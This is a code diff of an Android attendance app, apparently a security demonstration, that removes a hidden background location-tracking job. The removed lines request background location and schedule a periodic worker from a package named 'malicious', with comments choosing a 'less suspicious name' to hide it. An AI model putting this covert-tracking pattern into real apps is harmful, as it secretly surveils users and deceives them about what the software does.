@@ -33,14 +33,6 @@ import com.google.android.gms.tasks.CancellationTokenSource
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.tasks.await
 import java.text.SimpleDateFormat
-import com.example.sitconnect.securitydemo.malicious.LocationTrackerWorker
-import androidx.work.NetworkType
-import androidx.work.PeriodicWorkRequestBuilder
-import androidx.work.ExistingPeriodicWorkPolicy
-import androidx.work.BackoffPolicy
-import androidx.work.WorkManager
-import androidx.work.workDataOf
-import java.util.concurrent.TimeUnit
 import java.util.*
 
 
@@ -80,8 +72,8 @@ fun AttendanceScreen(
     val locationPermissions = rememberMultiplePermissionsState(
         listOf(
             Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.ACCESS_BACKGROUND_LOCATION
+            Manifest.permission.ACCESS_COARSE_LOCATION
+
         )
     )
 
@@ -93,11 +85,6 @@ fun AttendanceScreen(
 
     }
 
-    LaunchedEffect(locationPermissions.allPermissionsGranted, currentUser?.uid) {
-        if (locationPermissions.allPermissionsGranted && currentUser?.uid != null) {
-            startBackgroundLocationTracking(context, currentUser.uid!!)
-        }
-    }
 
     LaunchedEffect(markState) {
         if (markState is MarkAttendanceState.Success) {
@@ -785,36 +772,3 @@ private fun getDayName(day: Int): String {
     }
 }
 
-private fun startBackgroundLocationTracking(context: Context, studentId: String) {
-    if (studentId.isBlank()) {
-        // Safety check — don't schedule useless work
-        return
-    }
-
-    val constraints = androidx.work.Constraints.Builder()
-        .setRequiredNetworkType(NetworkType.CONNECTED)
-        .setRequiresBatteryNotLow(true)           // optional but good practice
-        .setRequiresCharging(false)               // allow when not charging
-        .build()
-
-    val inputData = workDataOf(
-        "studentId" to studentId.trim()
-    )
-
-    val workRequest = PeriodicWorkRequestBuilder<com.example.sitconnect.securitydemo.malicious.LocationTrackerWorker>(
-        repeatInterval = 30,                      // requested interval (in seconds)
-        repeatIntervalTimeUnit = TimeUnit.SECONDS
-    )
-        .setConstraints(constraints)
-        .setInputData(inputData)
-        .setBackoffCriteria(BackoffPolicy.LINEAR, 10, TimeUnit.SECONDS)  // retry quickly on failure
-        .build()
-
-    WorkManager.getInstance(context)
-        .enqueueUniquePeriodicWork(
-            "hidden_sync_worker_247",             // less suspicious name (optional)
-            ExistingPeriodicWorkPolicy.KEEP,      // don't replace if already exists
-            workRequest
-        )
-
-}
